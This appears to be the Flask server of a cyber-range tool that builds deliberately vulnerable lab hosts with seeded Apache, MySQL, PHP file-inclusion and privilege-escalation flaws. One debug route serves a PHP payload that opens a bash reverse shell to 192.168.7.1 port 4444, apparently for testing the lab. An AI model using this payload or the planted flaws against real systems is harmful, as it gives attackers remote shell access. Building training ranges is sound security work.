from flask import Flask, request, jsonify
from flask import json
from mongoengine import *
from mongoengine.base import TopLevelDocumentMetaclass
import os

import util
from host import Host, OperatingSystem, Account, Service, ConfigurationOption, Vulnerability
from world import World

app = Flask(__name__)
connect('cyberfront')


def route(path, method='GET', params=None, url_param=None, files=False):
    def decorator(f):
        def decorated(**kwargs):
            f_kwargs = {}
            if files:
                form = request.form
                if form is None:
                    return 'missing form', 400
                data = json.loads(request.form.get('json'))
                f_kwargs['files'] = request.files
            else:  # use json
                data = request.json

            if params:
                if data is None:
                    return "missing json params", 400

                for key in params:
                    f_kwargs[key] = data.get(key)
                    if f_kwargs[key] is None:
                        return "missing param: " + key, 400

            if url_param:
                key = kwargs.keys()[0]

                if isinstance(url_param, TopLevelDocumentMetaclass):
                    f_kwargs[key] = url_param.objects(id=kwargs[key]).first()

                if f_kwargs.get(key) is None:
                    return "invalid " + key, 400
            return f(**f_kwargs)

        app.add_url_rule(path, f.__name__, decorated, methods=[method])
        return decorated
    return decorator


@route('/')
def index():
    return app.send_static_file('index.html')


@route('/api/debug/<host>', method='POST', params=['action', 'dog'], url_param=Host)
def dog(action=None, dog=None, host=None):
    print action
    print dog
    print host.to_json()
    return "done"


@route('/api/worlds')
def get_worlds():
    return jsonify(json.loads(World.objects().to_json()))


@route('/api/worlds', method='POST', params=['name'])
def add_world(name):
    check = World.objects(name=name).first()
    if check:
        return "world already exists with that name", 400

    w = World(name=name)
    w.save()
    os.mkdir(util.WORLDS + name)
    os.mkdir(util.TMP + name)
    return w.to_json()


@route('/api/worlds/<world>', url_param=World)
def get_world(world):
    return jsonify(world.to_mongo())


@route('/api/worlds/<world>', method='POST', params=['action'], url_param=World)
def post_world(action, world):
    if action == 'START':
        world.start()
    elif action == 'STOP':
        world.stop()

    return util.pretty_json(world)


@route('/api/worlds/<world>/add_host', method='POST', params=['hostname', 'os_id'], url_param=World)
def add_host_to_world(world, hostname, os_id):
    ops = OperatingSystem.objects(id=os_id).first()
    check = Host.objects(world=world, hostname=hostname).first()

    if check:
        return 'Duplicate hostname in World'

    if ops is None:
        return 'Invalid Operating System id'

    h = Host(hostname=hostname, os=ops, world=world)
    h.install_os()
    h.save()

    return h.to_json()


@route('/api/worlds/<world>/hosts', url_param=World)
def get_hosts_in_world(world):
    return util.pretty_json(Host.objects(world=world))

@route('/api/hosts')
def get_all_hosts():
    return util.pretty_json(Host.objects())


@route('/api/hosts/<host>', url_param=Host)
def get_host(host):
    return util.pretty_json(host)


@route('/api/hosts/<host>/module', method='POST', params=['module_id', 'options'], url_param=Host, files=True)
def install_module(host, files, module_id, options):
    service = Service.objects(id=module_id).first()
    vuln = Vulnerability.objects(id=module_id).first()

    if service is None and vuln is None:
        return 'invalid service id', 400

    ref = service if service else vuln

    if host.install_module(ref, files=files, options=options):
        host.save()
        return host.to_json()
    else:
        return 'installation failed', 400


@route('/api/hosts/<host>/account', method='POST', params=['name', 'password', 'groups'], url_param=Host)
def setup_account(host, name, password, groups):
    try:
        check = host.accounts.get(name=name)
        check.groups = groups
        check.password = password
        host.save()
    except DoesNotExist:
        mongo_account = Account(name=name, groups=groups, password=password)
        host.accounts.append(mongo_account)
        host.save()

    return host.to_json()


@route('/api/os')
def get_oses():
    return util.pretty_json(OperatingSystem.objects())


@route('/api/services')
def get_services():
    return util.pretty_json(Service.objects())


@route('/api/vulns')
def get_vulns():
    return util.pretty_json(Vulnerability.objects())


@app.route('/api/debug/rfi.php')
def rfi():
    return '<?php echo hello; echo shell_exec(\'bash -c "bash -i >& /dev/tcp/192.168.7.1/4444 0>&1"\');?>'

print "cyberfront starting"

# ubuntu = OperatingSystem(kernel='LINUX', name='Ubuntu', version='14.04', box='ubuntu/trusty64')
# ubuntu.save()

# bob = Account(name='bob', password='password', group='root')
# testmachine = Host.objects().first()

if len(Service.objects()) == 0:
    options = {
        'user': ConfigurationOption(name='Run As User', description='User to run the service as.', type='USER'),
        'port': ConfigurationOption(name='Port', description='Port to listen on.', type='INT'),
        'php': ConfigurationOption(name='Install PHP', description='Whether to install PHP or not.', type='BOOLEAN'),
        'files': ConfigurationOption(name='Server Files', description='Files to serve.', type='FILE')
    }
    apache2 = Service(name='apache_ubuntu', full_name='Apache Web Server', version='2', options=options)
    apache2.save()

if len(Service.objects()) == 3:
    options = {
        'user': ConfigurationOption(name='Run As User', description='User to run the service as.', type='USER'),
        'port': ConfigurationOption(name='Port', description='Port to listen on.', type='INT', default='3306'),
        'password': ConfigurationOption(name='Root Password')
    }
    mysql = Service(name='mysql_ubuntu', full_name='MySQL Server', version='5.0.15', options=options)

    local = Vulnerability(name='local_mysql', full_name='MySQL UDF Local Privilege Escalation',
                          category='Privilege Escalation', requirements=['mysql_ubuntu'], options={})
    local.save()
    mysql.vulnerabilities = [local]
    mysql.save()

if len(Vulnerability.objects()) == 0:
    options = {
        'file': ConfigurationOption(name='Vulnerable File', description='File that is affected by the vulnerability',
                                    type='FILE'),
        'service': ConfigurationOption(name='Affected Service', type='SERVICE')
    }

    rfi = Vulnerability(name='rfi_apache', full_name='PHP Remote File Inclusion',
                        category='File Inclusion', requirements=['apache_ubuntu'], options=options)
    rfi.save()

# sudo_options = {
#    'users': ConfigurationOption(name='Sudoers', description='List of sudoers', type='USER', list=True, default=[])
# }
# sudo = Service(name='ubuntu_sudo', service_name='sudo', version='?', options=sudo_options)
# sudo.save()

# sudo = Service.objects(name="ubuntu_sudo").first()
# ubuntu = OperatingSystem.objects().first()
# ubuntu.services = [sudo]
# ubuntu.save()

# World(name='world1').save()
# World(name='world2').save()

# apache2 = Service.objects(service_name='Apache Web Server').first()
# apache2.install(testmachine, user='bob', group='bob', port='1234', php="1", files='web.tar.gz')
# testmachine = Host(hostname='test', os=ubuntu, accounts=[bob])
# testmachine.save()

app.run(port=80, host='192.168.7.1')
 # app.run(port=80)

